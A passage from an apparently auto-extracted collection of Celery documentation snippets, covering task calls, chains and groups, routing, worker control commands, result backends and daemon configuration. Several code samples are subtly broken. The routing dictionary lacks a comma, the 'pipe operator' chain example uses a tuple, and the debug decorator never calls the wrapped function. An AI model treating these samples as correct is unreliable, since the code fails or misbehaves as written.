`control` command with the `--destination` (`-d`) option to send the `enable_events` command only to specific worker nodes (`w1@e.com`, `w2@e.com`). Requires the Celery application instance (`-A proj`).\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/monitoring.rst#2025-04-23_snippet_19\n\nLANGUAGE: console\nCODE:\n```\n$ celery -A proj control -d w1@e.com,w2@e.com enable_events\n```\n\n----------------------------------------\n\nTITLE: Executing Celery Task Asynchronously with delay() in Python\nDESCRIPTION: Shows the usage of the `delay()` method on a task object (`add`). This is a shortcut for `apply_async()` with positional arguments, sending the task message to a Celery worker for asynchronous execution. The result is retrieved using `get()` on the returned AsyncResult object.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/canvas.rst#2025-04-23_snippet_6\n\nLANGUAGE: pycon\nCODE:\n```\n>>> result = add.delay(2, 2)\n>>> result.get()\n4\n```\n\n----------------------------------------\n\nTITLE: Using Pydantic Models with Celery Tasks\nDESCRIPTION: Example demonstrating how to integrate Pydantic models with Celery tasks for automatic validation and serialization of task arguments and return values.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-5.5.rst#2025-04-23_snippet_0\n\nLANGUAGE: python\nCODE:\n```\nfrom pydantic import BaseModel\nfrom celery import Celery\n\napp = Celery('tasks')\n\nclass ArgModel(BaseModel):\n    value: int\n\nclass ReturnModel(BaseModel):\n    value: str\n\n@app.task(pydantic=True)\ndef x(arg: ArgModel) -> ReturnModel:\n    # args/kwargs type hinted as Pydantic model will be converted\n    assert isinstance(arg, ArgModel)\n\n    # The returned model will be converted to a dict automatically\n    return ReturnModel(value=f\"example: {arg.value}\")\n```\n\n----------------------------------------\n\nTITLE: Configuring Cache Result Backend in Celery\nDESCRIPTION: Examples of configuring the cache result backend with Memcached and in-memory options.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/configuration.rst#2025-04-23_snippet_18\n\nLANGUAGE: python\nCODE:\n```\nresult_backend = 'cache+memcached://127.0.0.1:11211/'\n\n# Using multiple Memcached servers\nresult_backend = \"\"\"\n    cache+memcached://172.19.26.240:11211;172.19.26.242:11211/\n\"\"\".strip()\n\n# The \"memory\" backend stores the cache in memory only\nresult_backend = 'cache'\ncache_backend = 'memory'\n```\n\n----------------------------------------\n\nTITLE: Canceling Task Execution\nDESCRIPTION: Examples of how to revoke/cancel task execution using result object or task ID\nSOURCE: https://github.com/celery/celery/blob/main/docs/faq.rst#2025-04-23_snippet_10\n\nLANGUAGE: python\nCODE:\n```\n>>> result = add.apply_async(args=[2, 2], countdown=120)\n>>> result.revoke()\n```\n\nLANGUAGE: python\nCODE:\n```\n>>> from proj.celery import app\n>>> app.control.revoke(task_id)\n```\n\n----------------------------------------\n\nTITLE: App-wide Custom Task Class Configuration\nDESCRIPTION: Shows how to configure a custom Task class for an entire Celery application using the task_cls parameter during app initialization. All tasks in the app will inherit from this class.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/tasks.rst#2025-04-23_snippet_40\n\nLANGUAGE: python\nCODE:\n```\nfrom celery import Celery\n\napp = Celery('tasks', task_cls='your.module.path:DatabaseTask')\n```\n\n----------------------------------------\n\nTITLE: Configuring Task Routing in Python\nDESCRIPTION: Examples of configuring task routing using the CELERY_ROUTES setting. Shows how to route tasks to specific queues and define custom routing logic.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-2.0.rst#2025-04-23_snippet_12\n\nLANGUAGE: python\nCODE:\n```\nCELERY_ROUTES = {'celery.ping': 'default',\n                 'mytasks.add': 'cpu-bound',\n                 'video.encode': {\n                     'queue': 'video',\n                     'exchange': 'media'\n                     'routing_key': 'media.video.encode'}}\n```\n\nLANGUAGE: python\nCODE:\n```\nCELERY_ROUTES = ('myapp.tasks.Router',\n                 {'celery.ping': 'default'})\n```\n\nLANGUAGE: python\nCODE:\n```\nclass Router(object):\n\n    def route_for_task(self, task, args=None, kwargs=None):\n        if task == 'celery.ping':\n            return 'default'\n```\n\n----------------------------------------\n\nTITLE: Setting Celery Configuration Prefix in Django Integration\nDESCRIPTION: Example showing how to configure the Celery application to use settings from Django's configuration with a 'CELERY' namespace prefix. This is needed when maintaining uppercase setting names in Django projects.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-4.0.rst#2025-04-23_snippet_2\n\nLANGUAGE: python\nCODE:\n```\napp.config_from_object('django.conf:settings', namespace='CELERY')\n```\n\n----------------------------------------\n\nTITLE: Updating Celery App Configuration in Python\nDESCRIPTION: This snippet demonstrates how to update Celery app configuration settings, including task serializer, accepted content types, result serializer, timezone, and UTC settings.\nSOURCE: https://github.com/celery/celery/blob/main/docs/getting-started/first-steps-with-celery.rst#2025-04-23_snippet_9\n\nLANGUAGE: python\nCODE:\n```\napp.conf.update(\n    task_serializer='json',\n    accept_content=['json'],  # Ignore other content\n    result_serializer='json',\n    timezone='Europe/Oslo',\n    enable_utc=True,\n)\n```\n\n----------------------------------------\n\nTITLE: Inspecting Celery Task Registry\nDESCRIPTION: This code snippet demonstrates how to examine the task registry in a Celery application. It shows how to access the registry to view all registered task names and their task classes.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/tasks.rst#2025-04-23_snippet_42\n\nLANGUAGE: python\nCODE:\n```\n>>> from proj.celery import app\n>>> app.tasks\n{'celery.chord_unlock':\n    <@task: celery.chord_unlock>,\n 'celery.backend_cleanup':\n    <@task: celery.backend_cleanup>,\n 'celery.chord':\n    <@task: celery.chord>}\n```\n\n----------------------------------------\n\nTITLE: Applying Task-Specific Annotations in Celery (Python)\nDESCRIPTION: Shows how to use the `task_annotations` setting with a dictionary to modify attributes of a specific task (`tasks.add` in this case). This example sets the `rate_limit` attribute for the specified task to '10/s'. This allows fine-grained configuration overrides without changing the task's source code.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/configuration.rst#2025-04-23_snippet_3\n\nLANGUAGE: python\nCODE:\n```\ntask_annotations = {'tasks.add': {'rate_limit': '10/s'}}\n```\n\n----------------------------------------\n\nTITLE: Accessing Task ID in Celery Task\nDESCRIPTION: Demonstrates how to access the current task ID within a Celery task using the task request object\nSOURCE: https://github.com/celery/celery/blob/main/docs/faq.rst#2025-04-23_snippet_6\n\nLANGUAGE: python\nCODE:\n```\n@app.task(bind=True)\ndef mytask(self):\n    cache.set(self.request.id, \"Running\")\n```\n\n----------------------------------------\n\nTITLE: Setting RabbitMQ Consumer Priority in Python\nDESCRIPTION: Example showing how to set consumer priority via x-priority in RabbitMQ using the consumer_arguments parameter. This allows for prioritization of consumers when multiple consumers are subscribed to the same queue.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-4.0.rst#2025-04-23_snippet_21\n\nLANGUAGE: python\nCODE:\n```\nconsumer = Consumer(channel, consumer_arguments={'x-priority': 3})\n```\n\n----------------------------------------\n\nTITLE: Starting the Celery Beat Scheduler Service\nDESCRIPTION: This console command starts the Celery beat service, which is responsible for triggering scheduled tasks. It requires the Celery application instance (`proj`) to be specified using the `-A` flag. Celery beat reads the schedule configuration and sends tasks to the message queue at the appropriate times.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/periodic-tasks.rst#2025-04-23_snippet_13\n\nLANGUAGE: console\nCODE:\n```\n$ celery -A proj beat\n```\n\n----------------------------------------\n\nTITLE: Combining Chains in Celery Python\nDESCRIPTION: Illustrates how to create and combine partial chains in Celery. Chains allow for sequential execution of tasks, where the output of one task becomes the input for the next.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/canvas.rst#2025-04-23_snippet_33\n\nLANGUAGE: python\nCODE:\n```\n>>> c1 = (add.s(4) | mul.s(8))\n\n# (16 + 4) * 8\n>>> res = c1(16)\n>>> res.get()\n160\n```\n\nLANGUAGE: python\nCODE:\n```\n# ((4 + 16) * 2 + 4) * 8\n>>> c2 = (add.s(4, 16) | mul.s(2) | (add.s(4) | mul.s(8)))\n\n>>> res = c2()\n>>> res.get()\n352\n```\n\n----------------------------------------\n\nTITLE: Configuring Celery task publish retry policy in Python\nDESCRIPTION: Uses the celeryd_after_setup signal to configure a custom task publish retry policy for the Celery worker, setting max retries, intervals, and steps.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-3.0.rst#2025-04-23_snippet_1\n\nLANGUAGE: python\nCODE:\n```\nfrom celery.signals import celeryd_after_setup\n\n@celeryd_after_setup.connect\ndef configure_worker(instance, conf, **kwargs):\n    conf.CELERY_TASK_PUBLISH_RETRY_POLICY = {\n        'max_retries': 100,\n        'interval_start': 0,\n        'interval_max': 1,\n        'interval_step': 0.2,\n    }\n```\n\n----------------------------------------\n\nTITLE: Scheduling a Celery Task with ETA in Pycon\nDESCRIPTION: Provides a session example of using Celery's apply_async with an absolute ETA (datetime) to schedule future execution. ETA must be a timezone-aware datetime value. Demonstrates the import and calculation of a future datetime, then passes it as the eta parameter for the task.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/calling.rst#2025-04-23_snippet_11\n\nLANGUAGE: pycon\nCODE:\n```\n>>> from datetime import datetime, timedelta, timezone\n\n>>> tomorrow = datetime.now(timezone.utc) + timedelta(days=1)\n>>> add.apply_async((2, 2), eta=tomorrow)\n```\n\n----------------------------------------\n\nTITLE: Querying Multiple Celery Tasks Information by ID\nDESCRIPTION: Retrieves detailed status and information for multiple tasks identified by their UUIDs. Requires the Celery application instance (`-A proj`) and a space-separated list of task IDs.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/monitoring.rst#2025-04-23_snippet_14\n\nLANGUAGE: console\nCODE:\n```\n$ celery -A proj inspect query_task id1 id2 ... idN\n```\n\n----------------------------------------\n\nTITLE: Creating Private Tasks in Celery Applications\nDESCRIPTION: Demonstrates how to create private tasks that are specific to a particular Celery application by setting the shared flag to False in the task decorator.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-3.0.rst#2025-04-23_snippet_18\n\nLANGUAGE: python\nCODE:\n```\n@celery.task(shared=False)\ndef add(x, y):\n    return x + y\n```\n\n----------------------------------------\n\nTITLE: Migrating from celery import task to celery import shared_task in Python\nDESCRIPTION: Shows how to update imports when migrating to the newer API. Users need to change the task import to use shared_task from the celery package.\nSOURCE: https://github.com/celery/celery/blob/main/docs/internals/deprecation.rst#2025-04-23_snippet_2\n\nLANGUAGE: python\nCODE:\n```\nfrom celery import task\n```\n\nLANGUAGE: python\nCODE:\n```\nfrom celery import shared_task\n```\n\n----------------------------------------\n\nTITLE: Implementing Custom Inspect Command in Celery\nDESCRIPTION: Example of creating a custom inspect command that retrieves the current prefetch count using the @inspect_command decorator.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/workers.rst#2025-04-23_snippet_45\n\nLANGUAGE: python\nCODE:\n```\nfrom celery.worker.control import inspect_command\n\n@inspect_command()\ndef current_prefetch_count(state):\n    return {'prefetch_count': state.consumer.qos.value}\n```\n\n----------------------------------------\n\nTITLE: Enabling/Disabling Celery Events\nDESCRIPTION: Commands to enable and disable event monitoring in a Celery worker using the control interface.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/workers.rst#2025-04-23_snippet_42\n\nLANGUAGE: pycon\nCODE:\n```\n>>> app.control.enable_events()\n>>> app.control.disable_events()\n```\n\n----------------------------------------\n\nTITLE: Example of Celery Task Callback with Partial Arguments in Python\nDESCRIPTION: Provides a concrete example of linking a callback signature (`add.s(8)`) to a parent task (`add.apply_async((2, 2), ...)`). The parent task calculates 2+2=4. This result (4) is then passed as the first argument to the callback, which calculates 4+8=12.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/canvas.rst#2025-04-23_snippet_20\n\nLANGUAGE: pycon\nCODE:\n```\n>>> add.apply_async((2, 2), link=add.s(8))\n```\n\n----------------------------------------\n\nTITLE: Handling Connection Errors in Celery Tasks\nDESCRIPTION: Example of catching and handling OperationalError exceptions that may occur when sending Celery tasks. The code logs the exception details using the Celery logger instead of allowing the exception to propagate.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/calling.rst#2025-04-23_snippet_16\n\nLANGUAGE: python\nCODE:\n```\n>>> from celery.utils.log import get_logger\n>>> logger = get_logger(__name__)\n\n>>> try:\n...     add.delay(2, 2)\n... except add.OperationalError as exc:\n...     logger.exception('Sending task raised: %r', exc)\n```\n\n----------------------------------------\n\nTITLE: Collecting Results from Task Graph in Celery Python\nDESCRIPTION: Shows how to use the collect method to iterate over results in a task graph, including intermediate results.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/canvas.rst#2025-04-23_snippet_39\n\nLANGUAGE: python\nCODE:\n```\n>>> list(res.collect())\n[(<AsyncResult: 7b720856-dc5f-4415-9134-5c89def5664e>, 4),\n (<AsyncResult: 8c350acf-519d-4553-8a53-4ad3a5c5aeb4>, 64)]\n```\n\nLANGUAGE: python\nCODE:\n```\n>>> for result, value in res.collect(intermediate=True):\n....\n```\n\n----------------------------------------\n\nTITLE: Getting Reserved Tasks from Workers\nDESCRIPTION: Python code to retrieve reserved tasks from workers using the inspect interface. Shows how to get information about tasks that have been received but are still waiting to be executed.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/workers.rst#2025-04-23_snippet_37\n\nLANGUAGE: pycon\nCODE:\n```\n>>> i.reserved()\n[{'worker1.example.com':\n    [{'name': 'tasks.sleeptask',\n      'id': '32666e9b-809c-41fa-8e93-5ae0c80afbbf',\n      'args': '(8,)',\n      'kwargs': '{}'}]}]\n```\n\n----------------------------------------\n\nTITLE: Loading Celery Configuration from an External Module Name in Python\nDESCRIPTION: Shows how to configure a Celery app object using configuration loaded from a named external Python module. Key parameter: the module string (e.g., 'celeryconfig'), which must be importable from Python's path. Example use case: centralizing declarative configuration. Requires the named module to define configuration variables as top-level attributes.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/application.rst#2025-04-23_snippet_7\n\nLANGUAGE: python\nCODE:\n```\nfrom celery import Celery\n\napp = Celery()\napp.config_from_object('celeryconfig')\n```\n\n----------------------------------------\n\nTITLE: Calling Tasks by Name\nDESCRIPTION: Examples of executing Celery tasks by name using send_task and signature methods for both direct calls and chains.\nSOURCE: https://github.com/celery/celery/blob/main/docs/faq.rst#2025-04-23_snippet_5\n\nLANGUAGE: python\nCODE:\n```\n>>> app.send_task('tasks.add', args=[2, 2], kwargs={})\n<AsyncResult: 373550e8-b9a0-4666-bc61-ace01fa4f91d>\n```\n\nLANGUAGE: python\nCODE:\n```\n>>> chain(\n...     app.signature('tasks.add', args=[2, 2], kwargs={}),\n...     app.signature('tasks.add', args=[1, 1], kwargs={})\n... ).apply_async()\n<AsyncResult: e9d52312-c161-46f0-9013-2713e6df812d>\n```\n\n----------------------------------------\n\nTITLE: Restarting Celery Workers using celery multi (Console)\nDESCRIPTION: Demonstrates starting and restarting Celery workers using the `celery multi` command, suitable for development environments. It starts a worker instance named '1' for the project 'proj', logs informational messages, uses 4 concurrent processes, and specifies a PID file location using the node name variable (`%n`). The second command restarts the same worker instance.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/workers.rst#2025-04-23_snippet_7\n\nLANGUAGE: console\nCODE:\n```\n$ celery multi start 1 -A proj -l INFO -c4 --pidfile=/var/run/celery/%n.pid\n$ celery multi restart 1 --pidfile=/var/run/celery/%n.pid\n```\n\n----------------------------------------\n\nTITLE: Configuring Redis Sentinel Connection\nDESCRIPTION: Configuration for connecting to Redis Sentinel cluster\nSOURCE: https://github.com/celery/celery/blob/main/docs/getting-started/backends-and-brokers/redis.rst#2025-04-23_snippet_5\n\nLANGUAGE: python\nCODE:\n```\napp.conf.broker_url = 'sentinel://localhost:26379;sentinel://localhost:26380;sentinel://localhost:26381'\napp.conf.broker_transport_options = { 'master_name': \"cluster1\" }\n```\n\n----------------------------------------\n\nTITLE: Setting Up Task-Specific Logging in Celery\nDESCRIPTION: Demonstrates the recommended way to set up a module-level logger for Celery tasks, using get_task_logger to ensure logs include task name and ID automatically.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-3.0.rst#2025-04-23_snippet_16\n\nLANGUAGE: python\nCODE:\n```\nfrom celery.utils.log import get_task_logger\n\nlogger = get_task_logger(__name__)\n\n@celery.task\ndef add(x, y):\n    logger.debug('Adding %r + %r' % (x, y))\n    return x + y\n```\n\n----------------------------------------\n\nTITLE: Adding Default Configuration Using a Callable - Python\nDESCRIPTION: This snippet illustrates using a callable (function) to supply default configuration for a Celery application by passing it to 'add_defaults'. The callable will be invoked when Celery's configuration is accessed, allowing for lazy initialization of heavy or runtime-dependent settings. The approach is suitable when configuration depends on dynamically available resources such as another application's settings (e.g., Flask).\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-3.0.rst#2025-04-23_snippet_12\n\nLANGUAGE: python\nCODE:\n```\ndef initialize_config():\n    # insert heavy stuff that can't be done at import time here.\n\napp.add_defaults(initialize_config)\n```\n\n----------------------------------------\n\nTITLE: Database Backend Configuration in Celery\nDESCRIPTION: Configuration example for the database backend in Celery, showing how to control table creation timing using the create_tables_at_setup option.\nSOURCE: https://github.com/celery/celery/blob/main/Changelog.rst#2025-04-23_snippet_2\n\nLANGUAGE: python\nCODE:\n```\napp.conf.result_backend = 'db+sqlite:///results.db'\napp.conf.database_create_tables_at_setup = False\n```\n\n----------------------------------------\n\nTITLE: Configuring accepted content types for Celery in Python\nDESCRIPTION: Sets the CELERY_ACCEPT_CONTENT setting to specify a whitelist of accepted serializers or MIME types for Celery messages, improving security by rejecting untrusted serializers.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-3.0.rst#2025-04-23_snippet_2\n\nLANGUAGE: python\nCODE:\n```\nCELERY_ACCEPT_CONTENT = ['json']\n```\n\nLANGUAGE: python\nCODE:\n```\nCELERY_ACCEPT_CONTENT = ['application/json']\n```\n\n----------------------------------------\n\nTITLE: Using Group Primitives in Celery (Python)\nDESCRIPTION: Shows how to use Celery's group primitive to execute multiple tasks in parallel and retrieve their results.\nSOURCE: https://github.com/celery/celery/blob/main/docs/getting-started/next-steps.rst#2025-04-23_snippet_9\n\nLANGUAGE: pycon\nCODE:\n```\n>>> from celery import group\n>>> from proj.tasks import add\n\n>>> group(add.s(i, i) for i in range(10))().get()\n[0, 2, 4, 6, 8, 10, 12, 14, 16, 18]\n\n>>> g = group(add.s(i) for i in range(10))\n>>> g(10).get()\n[10, 11, 12, 13, 14, 15, 16, 17, 18, 19]\n```\n\n----------------------------------------\n\nTITLE: Configuring Result Chord Ordering in Celery\nDESCRIPTION: Configuration setting for controlling chord result ordering behavior in Celery workers when using Redis backend. Required for compatibility between different Celery versions.\nSOURCE: https://github.com/celery/celery/blob/main/docs/getting-started/backends-and-brokers/redis.rst#2025-04-23_snippet_10\n\nLANGUAGE: python\nCODE:\n```\nresult_chord_ordered = False\n```\n\n----------------------------------------\n\nTITLE: Applying Decorators via Celery Annotations in Python\nDESCRIPTION: Illustrates how to use Celery annotations to apply custom decorators to task methods dynamically. This example defines a simple `debug_args` decorator and applies it to the `__call__` method of the `tasks.add` task using the `CELERY_ANNOTATIONS` setting. Keys starting with '@' in annotations indicate a decorator to be applied. Requires `functools.wraps`.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-3.0.rst#2025-04-23_snippet_25\n\nLANGUAGE: python\nCODE:\n```\ndef debug_args(fun):\n\n    @wraps(fun)\n    def _inner(*args, **kwargs):\n        print('ARGS: %r' % (args,))\n    return _inner\n\nCELERY_ANNOTATIONS = {\n    'tasks.add': {'@__call__': debug_args},\n}\n```\n\n----------------------------------------\n\nTITLE: Revoking Multiple Tasks by Multiple Stamped Headers\nDESCRIPTION: Example showing how to revoke tasks by multiple headers or header values using the revoke_by_stamped_headers method.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/workers.rst#2025-04-23_snippet_16\n\nLANGUAGE: pycon\nCODE:\n```\n>> app.control.revoke_by_stamped_headers({\n...    'header_A': 'value_1',\n...    'header_B': ['value_2', 'value_3'],\n})\n```\n\n----------------------------------------\n\nTITLE: Using Custom Task Base Class in Celery\nDESCRIPTION: Demonstrates how to use a custom task base class when defining a task using the @app.task decorator.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/application.rst#2025-04-23_snippet_26\n\nLANGUAGE: python\nCODE:\n```\n@app.task(base=DebugTask)\ndef add(x, y):\n    return x + y\n```\n\n----------------------------------------\n\nTITLE: Using Persistent Revoke State in Celery Workers\nDESCRIPTION: Command line examples showing how to configure workers to preserve the list of revoked tasks between worker restarts using the --statedb option.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/workers.rst#2025-04-23_snippet_14\n\nLANGUAGE: console\nCODE:\n```\n$ celery -A proj worker -l INFO --statedb=/var/run/celery/worker.state\n```\n\nLANGUAGE: console\nCODE:\n```\ncelery multi start 2 -l INFO --statedb=/var/run/celery/%n.state\n```\n\n----------------------------------------\n\nTITLE: Creating Immutable Subtasks in Celery with Python\nDESCRIPTION: Shows how to create immutable subtasks in Celery using the .si() shortcut, ensuring that arguments won't be modified when calling callbacks in a chain.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-3.0.rst#2025-04-23_snippet_15\n\nLANGUAGE: pycon\nCODE:\n```\n>>> chain(add.s(2, 2), clear_static_electricity.si())\n```\n\nLANGUAGE: pycon\nCODE:\n```\n>>> clear_static_electricity.subtask(immutable=True)\n```\n\n----------------------------------------\n\nTITLE: Starting Celery Worker with RDB Signal Debugging Enabled (Console)\nDESCRIPTION: This console command demonstrates how to start a Celery worker while enabling the remote debugging signal feature. Setting the environment variable `CELERY_RDBSIG=1` instructs the worker to initiate an `rdb` session when it receives the `SIGUSR2` signal.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/debugging.rst#2025-04-23_snippet_5\n\nLANGUAGE: console\nCODE:\n```\n$ CELERY_RDBSIG=1 celery worker -l INFO\n```\n\n----------------------------------------\n\nTITLE: Configuring Redis Result Backend in Celery\nDESCRIPTION: Examples of configuring the Redis result backend with different connection options, including TLS and Unix socket connections.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/configuration.rst#2025-04-23_snippet_21\n\nLANGUAGE: python\nCODE:\n```\nresult_backend = 'redis://localhost/0'\n\n# Use the rediss:// protocol to connect to redis over TLS\nresult_backend = 'rediss://username:password@host:port/db?ssl_cert_reqs=required'\n\n# Unix socket connection\nresult_backend = 'socket:///path/to/redis.sock'\n```\n\n----------------------------------------\n\nTITLE: Broadcasting Synchronous Celery Control Commands with Reply (Python)\nDESCRIPTION: Demonstrates sending a remote control command ('rate_limit') to Celery workers and waiting for replies using `app.control.broadcast` with the `reply=True` argument. The command sets a rate limit for a specific task. The function waits for responses from workers within a default timeout (1 second) and returns a list of dictionaries containing worker names and their replies.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/workers.rst#2025-04-23_snippet_10\n\nLANGUAGE: python\nCODE:\n```\n>>> app.control.broadcast('rate_limit', {\n...     'task_name': 'myapp.mytask', 'rate_limit': '200/m'}, reply=True)\n[{'worker1.example.com': 'New rate limit set successfully'},\n {'worker2.example.com': 'New rate limit set successfully'},\n {'worker3.example.com': 'New rate limit set successfully'}]\n```\n\n----------------------------------------\n\nTITLE: Configuring Generic 'celerybeat' Init Script via /etc/default/celerybeat\nDESCRIPTION: Shows an example configuration file (`/etc/default/celerybeat`) for the generic `celerybeat` init script. It defines essential variables like the path to the Celery binary (`CELERY_BIN`), the Celery app instance (`CELERY_APP`), the working directory (`CELERYBEAT_CHDIR`), and additional command-line options for the `celery beat` process (`CELERYBEAT_OPTS`), such as specifying the schedule database file location. This file is sourced by the `/etc/init.d/celerybeat` script.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/daemonizing.rst#2025-04-23_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\n# Absolute or relative path to the 'celery' command:\nCELERY_BIN=\"/usr/local/bin/celery\"\n#CELERY_BIN=\"/virtualenvs/def/bin/celery\"\n\n# App instance to use\n# comment out this line if you don't use an app\nCELERY_APP=\"proj\"\n# or fully qualified:\n#CELERY_APP=\"proj.tasks:app\"\n\n# Where to chdir at start.\nCELERYBEAT_CHDIR=\"/opt/Myproject/\"\n\n# Extra arguments to celerybeat\nCELERYBEAT_OPTS=\"--schedule=/var/run/celery/celerybeat-schedule\"\n```\n\n----------------------------------------\n\nTITLE: Safely Encoding AWS Credentials in Broker URL\nDESCRIPTION: Python code to properly encode AWS credentials in the broker URL using Kombu's safequote utility, ensuring special characters in credentials are properly handled.\nSOURCE: https://github.com/celery/celery/blob/main/docs/getting-started/backends-and-brokers/sqs.rst#2025-04-23_snippet_2\n\nLANGUAGE: python\nCODE:\n```\nfrom kombu.utils.url import safequote\n\naws_access_key = safequote(\"ABCDEFGHIJKLMNOPQRST\")\naws_secret_key = safequote(\"ZYXK7NiynG/TogH8Nj+P9nlE73sq3\")\n\nbroker_url = \"sqs://{aws_access_key}:{aws_secret_key}@\".format(\n    aws_access_key=aws_access_key, aws_secret_key=aws_secret_key,\n)\n```\n\n----------------------------------------\n\nTITLE: Linking Multiple Callbacks to a Celery Task in Python\nDESCRIPTION: Illustrates how to attach multiple callback tasks to a parent task by specifying a list of signatures as link. All callbacks will be executed in order with the result of the parent as input. Requires all referenced tasks to be registered in the current Celery app.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/calling.rst#2025-04-23_snippet_7\n\nLANGUAGE: python\nCODE:\n```\nadd.apply_async((2, 2), link=[add.s(16), other_task.s()])\n```\n\n----------------------------------------\n\nTITLE: Listing Active Celery Nodes\nDESCRIPTION: Displays a list of active worker nodes currently part of the Celery cluster defined by the application `proj`. Requires the Celery application instance (`-A proj`) to be specified.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/monitoring.rst#2025-04-23_snippet_2\n\nLANGUAGE: console\nCODE:\n```\n$ celery -A proj status\n```\n\n----------------------------------------\n\nTITLE: Revoking Tasks by Stamped Headers in Celery\nDESCRIPTION: Examples of how to revoke tasks by their stamped headers using the revoke_by_stamped_headers method with various options for termination.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/workers.rst#2025-04-23_snippet_15\n\nLANGUAGE: pycon\nCODE:\n```\n>>> app.control.revoke_by_stamped_headers({'header': 'value'})\n\n>>> app.control.revoke_by_stamped_headers({'header': 'value'}, terminate=True)\n\n>>> app.control.revoke_by_stamped_headers({'header': 'value'}, terminate=True, signal='SIGKILL')\n```\n\n----------------------------------------\n\nTITLE: Generating Dependency Graph Image for Celery Task Results\nDESCRIPTION: Python and bash code snippets demonstrating how to generate a visual representation of task dependencies using the AsyncResult.graph feature in Celery 3.0.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-3.0.rst#2025-04-23_snippet_2\n\nLANGUAGE: python\nCODE:\n```\nwith open('graph.dot') as fh:\n    result.graph.to_dot(fh)\n```\n\nLANGUAGE: bash\nCODE:\n```\n$ dot -Tpng graph.dot -o graph.png\n```\n\n----------------------------------------\n\nTITLE: Chaining Tasks Using Pipe Operator in Celery\nDESCRIPTION: Shows how to chain Celery tasks using the pipe operator (|) to create a sequence of tasks where the output of one becomes the input to the next.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/whatsnew-3.0.rst#2025-04-23_snippet_6\n\nLANGUAGE: pycon\nCODE:\n```\n>>> (add.s(2, 2), pow.s(2)).apply_async()\n```\n\n----------------------------------------\n\nTITLE: Configuring Autoscaling with Command Line Arguments\nDESCRIPTION: Example showing how to enable autoscaling for Celery workers using the --autoscale command line option. This allows specifying maximum and minimum concurrency values to dynamically adjust worker pool size based on workload.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/workers.rst#2025-04-23_snippet_21\n\nLANGUAGE: text\nCODE:\n```\n--autoscale=AUTOSCALE\n     Enable autoscaling by providing\n     max_concurrency,min_concurrency.  Example:\n       --autoscale=10,3 (always keep 3 processes, but grow to\n      10 if necessary).\n```\n\n----------------------------------------\n\nTITLE: Using Celery's Stamping API in Python Console\nDESCRIPTION: Illustrates the use of Celery's Stamping API to label tasks and groups for debugging purposes.\nSOURCE: https://github.com/celery/celery/blob/main/docs/userguide/canvas.rst#2025-04-23_snippet_70\n\nLANGUAGE: pycon\nCODE:\n```\n>>> sig1 = add.si(2, 2)\n>>> sig1_res = sig1.freeze()\n>>> g = group(sig1, add.si(3, 3))\n>>> g.stamp(stamp='your_custom_stamp')\n>>> res = g.apply_async()\n>>> res.get(timeout=TIMEOUT)\n[4, 6]\n>>> sig1_res._get_task_meta()['stamp']\n['your_custom_stamp']\n```\n\n----------------------------------------\n\nTITLE: Starting Celery Worker in Django Project\nDESCRIPTION: This command starts a Celery worker for a Django project. It uses the -A flag to specify the project name and sets the log level to INFO.\nSOURCE: https://github.com/celery/celery/blob/main/docs/django/first-steps-with-django.rst#2025-04-23_snippet_5\n\nLANGUAGE: console\nCODE:\n```\n$ celery -A proj worker -l INFO\n```\n\n----------------------------------------\n\nTITLE: Task Priority Inheritance in Celery Chain\nDESCRIPTION: Example showing how task priority is inherited through a chain of tasks when task_inherit_parent_priority is enabled. Demonstrates priority propagation through linked tasks.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-4.3.rst#2025-04-23_snippet_2\n\nLANGUAGE: python\nCODE:\n```\nc = celery.chain(\n  add.s(2), # priority=None\n  add.s(3).set(priority=5), # priority=5\n  add.s(4), # priority=5\n  add.s(5).set(priority=3), # priority=3\n  add.s(6), # priority=3\n)\n```\n\n----------------------------------------\n\nTITLE: Defining Abstract Task Class in Python\nDESCRIPTION: Shows how to create an abstract task class that won't be automatically registered. Used when you want to create a base task class that other tasks inherit from.\nSOURCE: https://github.com/celery/celery/blob/main/docs/history/changelog-1.0.rst#2025-04-23_snippet_8\n\nLANGUAGE: 